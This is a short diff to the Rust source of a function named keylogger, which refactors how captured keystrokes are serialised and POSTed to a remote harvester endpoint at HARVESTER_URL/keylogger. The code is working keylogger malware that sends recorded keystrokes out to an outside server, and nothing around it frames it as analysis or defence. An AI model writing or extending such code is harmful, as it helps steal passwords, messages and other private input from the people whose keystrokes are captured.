@@ -15,11 +15,9 @@ pub fn keylogger(reqwest_client: Client) {
         let mut req = Req(Vec::with_capacity(KEY_BUFFERING));
         loop {
             if req.0.len() >= KEY_BUFFERING {
-                let json_body = serde_json::to_string(&req).unwrap();
                 let res = reqwest_client
                     .post(format!("http://{}/keylogger", *HARVESTER_URL))
-                    .header("Content-Type", "application/json")
-                    .body(json_body)
+                    .json::<Req>(&req)
                     .send()
                     .await;
                 match res {
